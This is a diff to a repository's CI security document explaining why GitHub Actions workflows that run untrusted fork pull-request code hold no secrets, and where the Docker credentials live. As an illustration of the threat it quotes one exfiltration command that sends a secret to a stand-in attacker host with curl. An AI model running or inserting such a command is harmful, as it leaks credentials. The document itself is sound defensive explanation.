@@ -10,7 +10,7 @@ workflow, or wiring real infra (Azure Postgres / SCCH) into CI.
 This is a teaching repo (Teaching-HTL-Leonding) — **anyone can fork it and open a
 pull request**, and a PR can change *any* file CI executes: a test, a build step,
 a script. So PR code is **untrusted code that runs on our runners**. If a workflow
-exposes a secret (an LLM API key, a database credential, the deploy webhook) to a
+exposes a secret (an LLM API key, a database credential, a registry password) to a
 job that runs PR code, that PR can exfiltrate it — e.g. `curl evil.com -d "$SECRET"`.
 
 The defense is simple to state: **the workflows that run untrusted PR code must
@@ -59,14 +59,14 @@ run untrusted PR code.**
   `qa.yml`, so the same rule applies: **no secrets, no env, `contents: read`** —
   and none are needed, the docs build touches no app code.
 - **`docker-publish.yml`** holds the real secrets (`DOCKER_USERNAME` /
-  `DOCKER_PASSWORD`, `AZURE_WEBAPP_CI_CD_URL`) — all of them in its
+  `DOCKER_PASSWORD`) — all of them in its
   `build-and-push` job, which is the only place in the repo that references a
   `secrets.*` value at all. It triggers **only** on `push` to `main` (a
   maintainer merge) and manual `workflow_dispatch`. A fork PR cannot produce a
   push to `main`, so it can never reach these secrets. It reuses `qa.yml` via
   `workflow_call` as a gate, then builds/publishes/deploys.
-  - The **`deploy-dev`** job hands the same image to the dev stage of the new
-    Azure environment (`docs/azure-runtime-env.md`). It is **secret-free**: it
+  - The **`deploy-dev`** job hands the same image to the dev stage
+    (`docs/azure-runtime-env.md`). It is **secret-free**: it
     reaches Azure by OIDC (below) and holds none of the Docker Hub credentials
     above.
 - **`promote.yml`** deploys an image version that already sits in the Azure
